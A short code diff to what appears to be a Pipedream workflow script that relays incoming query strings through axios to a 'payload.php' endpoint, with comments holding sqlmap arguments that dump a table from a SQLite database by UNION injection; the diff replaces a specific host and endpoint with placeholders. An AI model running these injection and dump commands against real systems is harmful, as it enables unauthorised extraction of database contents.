@@ -1,4 +1,5 @@
-//-u https://eoquyu4859rqbl3.m.pipedream.net/?0=1 --dump -C [Request] -T z --dbms=SQLite --answer=Y --technique=U
+//-u https://blah.m.pipedream.net/?0=1 --dump -C [Request] -T z --dbms=SQLite --answer=Y --technique=U
+//-c /home/sqlmap/.local/share/sqlmap/output/blah.m.pipedream.net/dump/SQLite_masterdb/z.csv
 
 import axios from "axios";
 
@@ -12,7 +13,7 @@ export default defineComponent({
     try{
       const resp = await axios({
         method: "GET",
-        url: `http://poc.mm2.in/payl0ad_saas1.php?`+querystring,
+        url: `http://yourwebsite/payload.php?`+querystring,
       });
 
       await $.respond({
